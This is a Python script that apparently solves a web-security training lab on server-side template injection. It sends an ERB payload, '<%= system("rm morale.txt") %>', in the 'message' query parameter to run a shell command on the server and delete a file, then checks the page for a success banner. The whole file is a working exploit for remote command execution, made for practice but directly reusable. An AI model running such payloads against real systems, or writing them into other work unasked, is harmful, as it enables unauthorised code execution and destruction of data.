from colorama import Fore
import argparse
import requests
import urllib3
import time
import re

          # disable request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

YELLOW = Fore.YELLOW
GREEN  = Fore.GREEN
RED    = Fore.RED

def getURL():
	parser = argparse.ArgumentParser(description='Example script with command-line arguments')
	parser.add_argument('-u', '--url' , help='Lab URL')
	args = parser.parse_args()
	if not any(vars(args).values()):
	    parser.print_help()
	    exit(1)
	LabUrl = args.url
	validUrl = re.match(r'^https?://\S+', LabUrl)
	if not validUrl:
		print(RED,"[-]",GREEN,"Please Enter Valid URL")
		exit(1)
	if LabUrl[-1] == '/':
		LabUrl = LabUrl[:-1]
	return LabUrl

def POST(url, cookies=None, data=None, proxies=None, headers=None, allow_redirects=False):
	try:
		return requests.post(url, cookies=cookies, data=data, headers=headers, proxies=proxies, allow_redirects=allow_redirects)
	except:
		print(RED,"[-]",GREEN,"POST request Faild to this url",RED,"=>",GREEN,url)
		exit(1)

def GET(url, cookies=None, data=None, proxies=None, headers=None, allow_redirects=False):
	try:
		return requests.get(url, cookies=cookies, params=data, headers=headers, proxies=proxies, allow_redirects=allow_redirects)
	except:
		print(RED,"[-]",GREEN,"POST request Faild to this url",RED,"=>",GREEN,url)
		exit(1)


def exploit(url):
	print(GREEN,"[+]",RED,"Starting Attack")
	ssti_payload = '<%= system("rm morale.txt") %>'
	params = {"message":ssti_payload}

	print(GREEN,"[+]",GREEN,"Sending SSTI Payload",YELLOW,"=>",GREEN,ssti_payload)
	homePage = GET(url,None,params)
	
	if 'Congratulations' in homePage.text:
		print(GREEN,"[+]",GREEN,"Attack successfully",YELLOW," =>",GREEN,"Lab Solved")
	else:
		from time import sleep
		sleep(3)
		homePage = GET(url)
		if 'Congratulations' in homePage.text:
			print(GREEN,"[+]",GREEN,"Attack successfully",YELLOW," =>",GREEN,"Lab Solved")
		else:
			print(RED,"[+]",GREEN,"Attack Falid",RED," =>",RED,"Lab Not Solved")
			exit(1)

exploit(getURL())